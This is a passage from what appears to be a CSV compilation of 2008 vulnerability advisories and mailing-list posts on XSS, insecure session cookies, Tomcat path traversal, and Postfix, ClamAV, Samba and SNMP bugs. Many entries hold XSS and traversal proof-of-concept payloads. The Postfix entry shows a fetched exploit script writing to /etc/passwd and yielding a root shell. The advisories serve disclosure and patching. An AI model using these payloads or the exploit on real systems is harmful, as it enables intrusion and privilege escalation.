<input type=""text"" name=""pass"" value='""><script>alert(1)</script>'>
<input type=submit></form>
<form method=""post"" action=""http://localhost/flatpress/contact.php"">
<input type=""text"" name=""name"" value='""><script>alert(1)</script>'>
<input type=submit></form>
Workaround/Fix
Update to 0.804.1.
Disclosure Timeline
2008-09-25 Vendor contacted
2008-09-25 Vendor released 0.804.1
2008-09-25 Published advisory
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the
name CVE-2008-4120 to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org/), which standardizes names for
security problems.
Credits and copyright
This vulnerability was discovered by Fabian Fingerle (published with
help from Hanno Boeck [0]). It's licensed under the creative commons
attribution license [1].
Fabian Fingerle, 2008-09-25, http://www.fabian-fingerle.de
[0] http://www.hboeck.de
[1] http://creativecommons.org/licenses/by/3.0/de/"
20150,"mantis CVE-2008-3102 (Re: menalto gallery: Session hijacking vulnerability, CVE-2008-3102)",,CVE-2008-3102,"Damn, subject is obviously wrong, it's mantis, gallery was already
CVE-2008-3662. Rest of the advisory is correct though.
Sorry for the confusion.
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
20158,"Squirrelmail: Session hijacking vulnerability, CVE-2008-3663",,CVE-2008-3663,"Squirrelmail: Session hijacking vulnerability, CVE-2008-3663
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3663
http://int21.de/cve/CVE-2008-3663-squirrelmail.html
http://enablesecurity.com/2008/08/11/surf-jack-https-will-not-save-you/
https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Perry
Description
When configuring a web application to use only ssl (e. g. by forwarding all
http-requests to https), a user would expect that sniffing and hijacking the
session is impossible.
Though, for this to be secure, one needs to set the session cookie to have the
secure flag. Else the cookie will be transferred through http if the victim's
browser does a single http-request on the same domain.
Squirrelmail does not set that flag. It is fixed in the 1.5 test versions, but
current 1.4.15 is vulnerable.
Disclosure Timeline
2008-08-12: Vendor contacted
2008-09-23 Published advisory
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
20159,"menalto gallery: Session hijacking vulnerability, CVE-2008-3102",,CVE-2008-3102,"menalto gallery: Session hijacking vulnerability, CVE-2008-3102
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3102
http://int21.de/cve/CVE-2008-3102-mantis.html
http://www.mantisbt.org/bugs/view.php?id=9524
http://www.mantisbt.org/bugs/view.php?id=9533
http://enablesecurity.com/2008/08/11/surf-jack-https-will-not-save-you/
https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Perry
Description
When configuring a web application to use only ssl (e. g. by forwarding all
http-requests to https), a user would expect that sniffing and hijacking the
session is impossible.
Though, for this to be secure, one needs to set the session cookie to have the
secure flag. Else the cookie will be transferred through http if the victim's
browser does a single http-request on the same domain.
The mantis bugtracker does not set that flag. The mantis team has fixed this
issue, but not released a new version yet.
Disclosure Timeline
2008-08-12: Vendor contacted
2008-08-13 Vendor committed fix to trunk
2008-09-23 Published advisory
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
20164,"Cross Site Scripting (XSS) Vulnerabilitiy in fuzzylime (cms) >=3.02, CVE-2008-3098",,CVE-2008-3098,"Cross Site Scripting (XSS) Vulnerabilitiy in fuzzylime (cms) >=3.02,
CVE-2008-3098
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3098
http://cms.fuzzylime.co.uk
http://www.datensalat.eu/~fabian/cve/CVE-2008-3098-fuzzylime-cms.html
Description
Fuzzylime (cms) is a way to run websites and keep it up-to-date. Once
installed, you can update from any internet-connected PC in the world -
you don't even need to know HTML! It has tons of features so whatever
you want from your site, chances are this script will be able to do it
for you.
Example
Assuming Fuzzylime is installed on http://localhost/fuzzylime/, anybody
could inject JavaScript:
<form method=""post""
action=""http://localhost/fuzzylime/admin/usercheck.php""> <input
type=""hidden"" name=""log"" value=""in""> <input type=""text""
name=""user""value='""><script>alert(1)</script>'> <input
type=submit></form>
Disclosure Timeline
2008-09-10 Vendor contacted
2008-09-20 Vendor released 3.03
2008-09-22 Advisory published
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the
name CVE-2008-3098 to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org/), which standardizes names for
security problems.
Credits and copyright
This vulnerability was discovered by Fabian Fingerle (published with
help from Hanno Boeck). It's licensed under the creative commons
attribution license.
Fabian Fingerle, 2008-09-22, http://www.fabian-fingerle.de"
20180,"drupal: Session hijacking vulnerability, CVE-2008-3661",,CVE-2008-3661,"drupal: Session hijacking vulnerability, CVE-2008-3661
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3661
http://int21.de/cve/CVE-2008-3661-drupal.html
http://enablesecurity.com/2008/08/11/surf-jack-https-will-not-save-you/
https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Perry
Description
When configuring a web application to use only ssl (e. g. by forwarding all
http-requests to https), a user would expect that sniffing and hijacking the
session is impossible.
Though, for this to be secure, one needs to set the session cookie to have the
secure flag. Else the cookie will be transferred through http if the victim's
browser does a single http-request on the same domain.
The drupal CMS is vulnerable to this issue. They don't consider this as a
drupal issue and have not published a fix yet.
Disclosure Timeline
2008-08-13: Vendor contacted
2008-09-20 Published advisory
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
20194,"menalto gallery: Session hijacking vulnerability, CVE-2008-3662",,CVE-2008-3662,"menalto gallery: Session hijacking vulnerability, CVE-2008-3662
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3662
http://int21.de/cve/CVE-2008-3662-gallery.html
http://gallery.menalto.com/gallery_2.2.6_released
http://enablesecurity.com/2008/08/11/surf-jack-https-will-not-save-you/
https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Perry
Description
When configuring a web application to use only ssl (e. g. by forwarding all
http-requests to https), a user would expect that sniffing and hijacking the
session is impossible.
Though, for this to be secure, one needs to set the session cookie to have the
secure flag. Else the cookie will be transferred through http if the victim's
browser does a single http-request on the same domain.
gallery versions before 2.2.6 did not set this flag.
Disclosure Timeline
2008-08-15: Vendor contacted
2008-09-18 Vendor releases 2.2.6
2008-09-18 Published advisory
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2008-3662 to this issue. This is a candidate for inclusion in the CVE
list (http://cve.mitre.org/), which standardizes names for security problems.
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, 2008-09-18, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
20212,[Suspected Spam][CVE-2008-4042] Postfix Linux-only local denial of service - PoC,,CVE-2008-4042,"Hello,
I have released this PoC for the Linux-only local denial of service
caused by the leak of epoll file descriptors.
This Proof of concept creates a pipe and adds it in postfix's epoll file
descriptor.
When the pipe is added, an endless loop will launch lots of events to
the local and master postfix processes.
This PoC will slowdown the system a lot.
You can find all the needed files at
http://www.wekk.net/research/CVE-2008-4042/ and
http://www.wekk.net/research/CVE-2008-3889/ and attached with this
email.
Feel free to write me for feedback, corrections, etc.
--
Albert Sellarès GPG id: 0x13053FFE
http://www.wekk.net whats_up jabber org
Linux User: 324456 Catalunya"
20263,[SECURITY] CVE-2008-2938 - Apache Tomcat information disclosure vulnerability - Updated,,CVE-2008-2938,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-2938: Apache Tomcat information disclosure vulnerability - Updated
Severity: Important (was moderate)
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.1.0 to 4.1.37
Tomcat 5.5.0 to 5.5.26
Tomcat 6.0.0 to 6.0.16
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected
Description (new information):
Further investigation of CVE-2008-2938 has shown that the vulnerability
also exists only with URIEncoding=""UTF-8"" set on the connector. In these
configurations arbitrary files in the docBase for an application,
including files such as web.xml, may be disclosed.
Users should also be aware that this vulnerability will apply when
processing requests with UTF-8 body encoding and
useBodyEncodingForURI=""true""
Mitigation:
6.0.x users should upgrade to 6.0.18
5.5.x users should upgrade to 5.5.27
4.1.x users should obtain the latest source from svn or apply this patch:
http://svn.apache.org/viewvc?view=rev&revision=681065
Example:
http://www.target.com/contextpath/%c0%ae%c0%ae/WEB-INF/web.xml
Credit:
This additional information was discovered by the Apache Tomcat security
team.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (Darwin)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkjHnCMACgkQb7IeiTPGAkMoLQCg2PxS09CpZGI9t+QcdifSfMh8
CHcAoOSRAPOzAFH5hx1w8jxOBthrAKEJ
=Fi0E
-----END PGP SIGNATURE-----"
20315,"clamav: Crash with crafted chm, CVE-2008-1389",,CVE-2008-1389,"clamav: Crash with crafted chm, CVE-2008-1389
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1389
http://int21.de/cve/CVE-2008-1389-clamav-chd.html
http://www.int21.de/cve/cve-2008-1389-samples.tar.bz2
https://wwws.clamav.net/bugzilla/show_bug.cgi?id=1089
Description
A fuzzing test showed weakness in the chm parser of clamav, which can possibly
be exploited.
The clamav team has disabled the chm module in older versions though freshclam
updates and has released 0.94 with a fixed parser.
The clamav team has not mentioned this issue in the release notes of 0.94,
which is very bad security behaviour.
Disclosure Timeline
2008-07-09: clamav bug opened
unknown date: clamav disables chm-parser through freshclam
2008-09-02 Vendor releases 0.94
2008-09-04 Released this advisory
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2008-1389 to this issue. This is a candidate for inclusion in the CVE
list (http://cve.mitre.org/), which standardizes names for security problems.
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, 2008-09-04, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
20320,"Multiple Cross Site Scripting (XSS) and SQL injection Vulnerabilities in XRMS, CVE-2008-3664",,CVE-2008-3664,"Multiple Cross Site Scripting (XSS) and SQL injection Vulnerabilities
in XRMS, CVE-2008-3664
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3664
http://nvd.nist.gov/nvd.cfm?cvename=CVE-2008-3664
http://xrms.sourceforge.net
Description
XRMS is a web-based application for managing business entities such as
employees, customers, contacts, activities with those contacts, etc.
The application is vulnerable to simple Cross Site Scripting, which can
be used for several isues
Example
Assuming XRMS is installed on http://localhost/xrms/, anybody could
inject JavaScript with:
http://localhost/xrms/login.php?target=""><script>alert(1);</script>
http://localhost/xrms/activities/some.php?title=""><script>alert(1);</script>
http://localhost/xrms/companies/some.php?company_name=""><script>alert(1);</script>
http://localhost/xrms/contacts/some.php?last_name=""><script>alert(1);</script>
http://localhost/xrms/campaigns/some.php?campaign_title=""><script>alert(1);</script>
http://localhost/xrms/opportunities/some.php?opportunity_title=""><script>alert(1);</script>
http://localhost/xrms/cases/some.php?case_title=""><script>alert(1);</script>
http://localhost/xrms/files/some.php?file_id=""><script>alert(1);</script>
http://localhost/xrms/reports/custom/mileage.php?starting=""><script>alert(1);</script>
...
A user could change their real name to <script>alert(1)</script>; will
be executed when the administrator looks at user list
A user could edit name/email of any user using SQL injection
vulnerbility in admin/users/self-2.php
Disclosure Timeline
2008-08-07 Vendor contacted
2008-09-04 Advisory published
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the
name CVE-2008-XXXX to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org/), which standardizes names for
security problems.
Credits and copyright
This vulnerability was discovered by Fabian Fingerle (published with
help from Hanno Boeck).
This vulnerability relate to CVE-2008-1129
It's licensed under the creative commons attribution license.
Fabian Fingerle, 2008-09-04, http://www.fabian-fingerle.de
--
_GPG_ 3D17 CAC8 1955 1908 65ED 5C51 FDA3 6A09 AB41 AB85
_chaos events near stuttgart_ www.datensalat.eu"
20354,"Multiple Cross Site Scripting (XSS) Vulnerabilities in vtigerCRM 5.0.4, CVE-2008-3101",,CVE-2008-3101,"Multiple Cross Site Scripting (XSS) Vulnerabilities in vtigerCRM 5.0.4,
CVE-2008-3101
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3101
http://nvd.nist.gov/nvd.cfm?cvename=CVE-2008-3101
http://www.vtiger.de/
Description
vtigerCRM is a Open Source Customer Relationship Management (CRM)
Software. The application is vulnerable to simple Cross Site Scripting,
which can be used for several isues
Example
Assuming vtigerCRM is installed on http://localhost/vtigercrm/, one can
inject JavaScript with:
http://localhost/vtigercrm/index.php?module=Products&action=index&parenttab=""><script>alert(1);</script>
http://localhost/vtigercrm/index.php?module=Users&action=Authenticate&user_password=""><script>alert(1);</script>
http://localhost/vtigercrm/index.php?module=Home&action=UnifiedSearch&query_string=""><script>alert(1);</script>
Workaround/Fix
vtiger CRM Security Patch for 5.0.4 [1]
Disclosure Timeline
2008-07-28 Vendor contacted
2008-07-28 Vendor fixed issue in test environment
2008-07-30 Vender released patch
2008-07-30 Vendor dev statet they'll release a second patch within days
2008-09-01 published advisory, no second patch from upstream yet
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the
name CVE-2008-3101 to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org/), which standardizes names for
security problems. Credits and copyright
This vulnerability was discovered by Fabian Fingerle [2] (published with
help from Hanno Boeck [3]). It's licensed under the creative
commons attribution license [4].
Fabian Fingerle, 2008-09-01
[1] http://www.vtiger.de/vtiger-crm/downloads/patches.html?tx_abdownloads_pi1[action]=getviewdetailsfordownload&tx_abdownloads_pi1[uid]=128&tx_abdownloads_pi1[category_uid]=5&cHash=e16be773a5
[2] http://www.fabian-fingerle.de
[3] http://www.hboeck.de
[4] http://creativecommons.org/licenses/by/3.0/de/
--
_GPG_ 3D17 CAC8 1955 1908 65ED 5C51 FDA3 6A09 AB41 AB85
_chaos events near stuttgart_ www.datensalat.eu"
20356,PoCfix (PoC for Postfix local root vuln - CVE-2008-2936),,CVE-2008-2936,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Hello,
The recent vulnerability in Postfix discovered by Sebastian Krahmer is
trivially exploitable when certain preconditions are met. Nevertheless,
it's very difficult to find such conditions in a real-world scenario. I
wrote this exploit for fun and to demonstrate that. I also hope it helps
sysadmins to check and test their systems.
I used an Ubuntu/Debian (IA32) system which *I had to make vulnerable on
purpose*. The tweaks were:
- - #1: make the spool writable to attacker
chmod o+w /var/mail
- - #2: disable mail aliases (LDA should be able to deliver mail directly to
""root"" mailbox)
- - #3: use ""local"" postfix process as LDA
Perhaps condition #1 is the most difficult to meet, for a normal
(non-privileged) user. But think about a privilege escalation if you manage
to get into the ""mail"" group first (spool dir is tipically writable by
members of ""mail"" group).
For #2, it depends on configuration, but Ubuntu/Debian usually creates an
alias for ""root"", so that mail is delivered to a non-root account (and
making the system non vulnerable to this exploit).
When installing Postfix, you are asked to choose a local delivery agent
(LDA). I found one of my test systems using procmail (not vulnerable) and
another one using postfix built-in LDA (vulnerable).
For a quick test, normally, it will be sufficient to append the following
lines to /etc/postfix/main.cf:
alias_maps =
mailbox_command =
(left blank intentionally)
Finally, postfix should be refreshed:
postfix reload
There are other preconditions like:
- - #4: postfix should not be using maildir-style mailboxes
- - #5: mailbox for ""root"" should not exist (or at least you should have
permission to delete it, which is not always possible, even when #1 is true)
My script tries to do its best to check for these conditions (postfix
config is very flexible, I only checked some typical parameters). Feel free
to write me for corrections, etc.
==============
roman@jupiter:~$ wget http://www.rs-labs.com/exploitsntools/rs_pocfix.sh
roman@jupiter:~$ chmod a+x rs_pocfix.sh
roman@jupiter:~$ ./rs_pocfix.sh
#
# ""rs_pocfix.sh"" (PoC for Postfix local root vulnerability: CVE-2008-2936)
# by Roman Medina-Heigl Hernandez a.k.a. RoMaNSoFt <roman rs-labs com>
#
# Tested: Ubuntu / Debian
#
# [ Madrid, 30.Aug.2008 ]
#
[*] Postfix seems to be installed
[*] Hardlink to symlink not dereferenced
[*] Spool dir is writable
[*] Backed up: /etc/passwd (saved as ""/tmp/pocfix_target_backup.18107"")
[*] Sending mail (3 seconds wait)
[*] Exploit successful (appended data to /etc/passwd). Now ""su dsr"", pass
is ""dsrrocks"")
roman@jupiter:~$ su dsr
Password:
sh-3.1#
==============
PS: I didn't find Wietse's nice advisory [1] on postfix.org site (or at
least, if it exists, it's not easy to find it). Although it seems that some
non-POSIX issues in OS are contributing to the vulnerability, IMHO it's a
(low-medium risk) vulnerability in Postfix and it deserves to be listed on
postfix page. Despite this issue, Postfix continues being one of the best
mail server software ever made and my favourite MTA.
[1] http://article.gmane.org/gmane.mail.postfix.announce/110
- --
Cheers,
- -Roman
PGP Fingerprint:
09BB EFCD 21ED 4E79 25FB 29E1 E47F 8A7D EAD5 6742
[Key ID: 0xEAD56742. Available at KeyServ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
iD8DBQFIunoI5H+KferVZ0IRAkBrAKCwgHV+6O+At5Hw0dsYs8kYJZQjZACeJ96a
Ww7gCuqOt32rA2HhiTuKeRk=
=oo87
-----END PGP SIGNATURE-----"
20580,[CVE-2008-2370] Apache Tomcat information disclosure vulnerability,,CVE-2008-2370,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-2370: Apache Tomcat information disclosure vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.1.0 to 4.1.37
Tomcat 5.5.0 to 5.5.26
Tomcat 6.0.0 to 6.0.16
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected
Description:
When using a RequestDispatcher the target path was normalised before the
query string was removed. A request that included a specially crafted
request parameter could be used to access content that would otherwise be
protected by a security constraint or by locating it in under the WEB-INF
directory.
Mitigation:
6.0.x users should upgrade to 6.0.18
5.5.x users should obtain the latest source from svn or apply this patch
which will be included from 5.5.27
http://svn.apache.org/viewvc?rev=680949&view=rev
4.1.x users should obtain the latest source from svn or apply this patch
which will be included from 4.1.38
http://svn.apache.org/viewvc?rev=680950&view=rev
Example:
For a page that contains:
<%
pageContext.forward(""/page2.jsp?somepar=someval&par=""+request.getParameter(""blah""));
%>
an attacker can use:
http://host/page.jsp?blah=/../WEB-INF/web.xml
Credit:
This issue was discovered by ﻿Stefano Di Paola of Minded Security Research
Labs.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkiTGGkACgkQb7IeiTPGAkNeQACdHk1KQ98Dx45Sc+Hslw/YIBH7
8b4An1WZ30LS34Pxx4Rc+VzqhswLLbZd
=Zbvc
-----END PGP SIGNATURE-----"
20581,[CVE-2008-1232] Apache Tomcat XSS vulnerability,,CVE-2008-1232,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-1232: Apache Tomcat XSS vulnerability
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.1.0 to 4.1.37
Tomcat 5.5.0 to 5.5.26
Tomcat 6.0.0 to 6.0.16
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected
Description:
The message argument of HttpServletResponse.sendError() call is not only
displayed on the error page, but is also used for the reason-phrase of HTTP
response. This may include characters that are illegal in HTTP headers. It
is possible for a specially crafted message to result in arbitrary content
being injected into the HTTP response. For a successful XSS attack,
unfiltered user supplied data must be included in the message argument.
Mitigation:
6.0.x users should upgrade to 6.0.18
5.5.x users should obtain the latest source from svn or apply this patch
which will be included from 5.5.27
http://svn.apache.org/viewvc?rev=680947&view=rev
4.1.x users should obtain the latest source from svn or apply this patch
which will be included from 4.1.38
http://svn.apache.org/viewvc?rev=680947&view=rev (connector only)
http://svn.apache.org/viewvc?rev=680948&view=rev
Example:
<%@page contentType=""text/html""%>
<%
~ // some unicode characters, that result in CRLF being printed
~ final String CRLF = ""u010Du010A"";
~ final String payload = CRLF + CRLF + ""<script
type='text/javascript'>document.write('Hi, there!')</script><div
style='display:none'>"";
~ final String message = ""Authorization is required to access "" + payload;
~ response.sendError(403, message);
%>
Credit:
This issue was discovered by Konstantin Kolinko.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkiTGFsACgkQb7IeiTPGAkNG6ACfY+P91mt1/h06Q8c5foCJldFp
9B8An2OvenCD+3nWbLazp6Th+lxWgL7f
=lTUT
-----END PGP SIGNATURE-----"
20630,"Cross Site Scripting (XSS) in Owl <=0.95, CVE-2008-3100",,CVE-2008-3100,"Cross Site Scripting (XSS) in Owl <=0.95, CVE-2008-3100
References:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3100
http://owl.sourceforge.net/
http://www.datensalat.eu/~fabian/cve/CVE-2008-3100-Owl.html
Description:
Owl is a multi user document repository (knowledgebase) system for
publishing files/documents onto the web. The application is vulnerable
to simple Cross Site Scripting, which can be used for several isues
Example:
Assuming Owl is installed on http://localhost/Owl/, one can inject
JavaScript with:
http://localhost/Owl/register.php?myaction=getpasswd&username=""><script>alert(1);</script>
Workaround/Fix:
Replace your owl.lib.php with the version from
http://owl.cvs.sourceforge.net/*checkout*/owl/owl-0.90/lib/owl.lib.php
Disclosure Timeline:
2008-07-27 Vendor contacted
2008-07-28 Vendor: fixed issue in cvs / no need for new stable release
2008-07-28 Advisory published
CVE Information:
The Common Vulnerabilities and Exposures (CVE) project has assigned the
name CVE-2008-3100 to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org/), which standardizes names for
security problems.
Credits and copyright:
This vulnerability was discovered by Fabian Fingerle (published with
help from Hanno Boeck (http://www.hboeck.de)). It's licensed under the
creative commons attribution license 3.0.
Fabian Fingerle, 2008-07-28, http://www.fabian-fingerle.de
--
_GPG_ 3D17 CAC8 1955 1908 65ED 5C51 FDA3 6A09 AB41 AB85
_chaos events near stuttgart_ www.datensalat.eu"
20702,Vulnerability CVE-2008-3671 - MyReview's vulnerability in the access control system,,CVE-2008-3671,"Incorrect management of the submission and camera ready versions of
submitted papers to the MyReview system lets unintended users download
these documents. This information leakage can be used to illegally
retrieve sensitive or licensed documents.
I. Description
The MyReview web application is an open-source web application used in
the research community To manage the paper submission and paper review
phases of conferences. Based on the well known PHP+MySQL framework and
distributed under the GNU General Public License, it has been used by
thousands of conferences worldwide.
Incorrect management of the submission and camera ready versions of
submitted papers to the MyReview system lets unintended users download
these documents. This flaw bypass all the access controls implemented
by the MyReview developers. This information leakage is critical as
the documents submitted to the conferences, and mostly at the
submission phase, contain sensitives information researchers may not
want to be publicized.
Besides, this flaw can be used by attackers to retrieve at will the
final version of the documents, after the conferences is done.
However, these final versions may be not free, as it is often the case
for conferences.
More information about this flaw will be publicized later on, as it
could be used to attack existing deployment of the MyReview system.
II. Impact
Exploitation of this vulnerability could lead to the lost of the
sensitive information managed by MyReview: submission and camera ready
version of the submitted paper may be downloaded
III. Solution
The Laboratoire de Recherche en Informatique (LRI), which provide
MyReview has been contacted and they receive a patch I made for this
vulnerability. However, to avoid unpatched website attacks (which are
very easy to do), the author decided to let the LRI making the
decision about how to efficiently performed the update. Please see
your vendor's advisory for updates and mitigation capabilities. A good
point would be to subscribe to MyReview newsletter, if not done yet.
Version and platform Affected
Affected Platforms - Any
Affected Software - MyReview, http://myreview.intellagence.eu/
Affected Versions - Any (prior or equal to 1.9.9, as 2.0 is still in beta)
Severity - High
Requirements
Authentication - None
Access - Distant (Internet)
References
<to be upgraded later on>
Credit
This vulnerability was reported by Julien A. Thomas.
Contact : julien.thomas telecom-bretagne eu
TELECOM Bretagne homepage: http://perso.telecom-bretagne.eu/julienthomas/
Personal homepage: http://www.julienthomas.eu/
Other Information
Date Discovered - 16/07/2008
Date Public - 18/07/2008
Date First Published - 18/07/2008
Date Last Updated - 18/07/2008
CVE Name (candidate) - CVE-2008-3671
PS: sorry if this message was sent twice put I got some mailer-daemons
rejects ...
Julien"
20959,SNMPv3 Authentication Bypass - CVE-2008-0960,,CVE-2008-0960,"I just finished testing my latest code, it's a patch for Net-SNMP 5.4.1.1 that allow you to exploit the CVE-2008-0960 for bypass the HMAC validation on SNMP v3 (multiple vendor affected).
You can download it at:
http://lab.mediaservice.net/code.php#snmpv3
inode
--
Agazzini Maurizio @ Mediaservice.net S.R.L.
0xF574450C - 09C5 E9A5 E481 D70A 708E DC3B 690D 1A36 F574 450C
""C programmers never die. They are just cast into void.""
http://mediaservice.net/disclaimer"
21059,[SECURITY] CVE-2008-1947: Tomcat host-manager XSS vulnerability,,CVE-2008-1947,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-1947: Tomcat host-manager XSS vulnerability
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
Tomcat 5.5.9 to 5.5.26
Tomcat 6.0.0 to 6.0.16
This issue has been fixed in the source repositories for each version and
will be included in 5.5.27 and 6.0.17. It is anticipated that these
versions will be released shortly.
Description:
The user supplied hostname attribute is not filtered before being included
in the output.
Mitigation:
Do not visit untrusted sites whilst logged in to the host-manager
application and log out (close the browser) once finished with the
host-manager.
Example:
Assume that after logged in, the victim was lead to the malicious web
server with following file installed.
<form action=""http://localhost:8080/host-manager/html/add"" method=""get"">
~ <INPUT TYPE=""hidden"" NAME='name' VALUE=""<script>alert()</script>"">
~ <INPUT TYPE=""hidden"" NAME='aliases' VALUE=""somealias"">
~ <input type=""submit"">
</form>
Credit:
These issues were discovered by Petr Splichal of RedHat.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkhEahEACgkQb7IeiTPGAkOQggCgirNfHSCkMDhcEzG6Ig1N0WzP
qesAoKXePHeBKaB0VzeBoowW5kvZpBQx
=4nQe
-----END PGP SIGNATURE-----"
21092,[SAMBA] CVE-2008-1105 - Boundary failure when parsing SMB responses,,CVE-2008-1105,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================
==
== Subject: Boundary failure when parsing SMB responses
== can result in a buffer overrun
==
== CVE ID#: CVE-2008-1105
==
== Versions: Samba 3.0.0 - 3.0.29 (inclusive)
==
== Summary: Specifically crafted SMB responses can result
== in a heap overflow in the Samba client code.
== Because the server process, smbd, can itself
== act as a client during operations such as
== printer notification and domain authentication,
== this issue affects both Samba client and server
== installations.
==
==========================================================
===========
Description
===========
Secunia Research reported a vulnerability that allows for
the execution of arbitrary code in smbd. This defect is
is a result of an incorrect buffer size when parsing SMB
replies in the routine receive_smb_raw().
==================
Patch Availability
==================
A patch addressing this defect has been posted to
http://www.samba.org/samba/security/
Additionally, Samba 3.0.30 has been issued as a security
release to correct the defect. Samba administrators are
advised to upgrade to 3.0.30 or apply the patch as soon
as possible.
=======
Credits
=======
This vulnerability was reported to Samba developers by
Alin Rad Pop, Secunia Research.
The time line is as follows:
* May 15, 2008: Initial report to security samba org.
* May 15, 2008: First response from Samba developers confirming
the bug along with a proposed patch.
* May 28, 2008: Public security advisory made available.
==========================================================
== Our Code, Our Bugs, Our Responsibility.
== The Samba Team
==========================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFIPXTkIR7qMdg1EfYRAhaqAJ0cA6XoFP7debyYutME9fYTenfNVgCguM0I
nppfSSUdqtpbxbESEXjrnhU=
=1yBZ
-----END PGP SIGNATURE-----"
21440,"Correcting CVEs (was Re: [Full-disclosure] Cross site scripting issues in s9y (CVE-2008-1386, CVE-2008-1387))",,CVE-2008-1386,"Am Dienstag 22 April 2008 schrieb Hanno Böck:
> Two smaller issues in s9y, published here:
> http://int21.de/cve/CVE-2008-1386-s9y.html
> http://int21.de/cve/CVE-2008-1387-s9y.html
Damn, it was too early in the morning.
The correct CVEs (as listed in the advisory below) are CVE-2008-1385 and
CVE-2008-1386.
The correct URLs:
http://int21.de/cve/CVE-2008-1385-s9y.html
http://int21.de/cve/CVE-2008-1386-s9y.html
Sorry for any confusion this has caused.
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
21442,"Cross site scripting issues in s9y (CVE-2008-1386, CVE-2008-1387)",,CVE-2008-1386,"Two smaller issues in s9y, published here:
http://int21.de/cve/CVE-2008-1386-s9y.html
http://int21.de/cve/CVE-2008-1387-s9y.html
Cross Site Scripting (XSS) in serendipity 1.3 referrer plugin, CVE-2008-1385
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1385
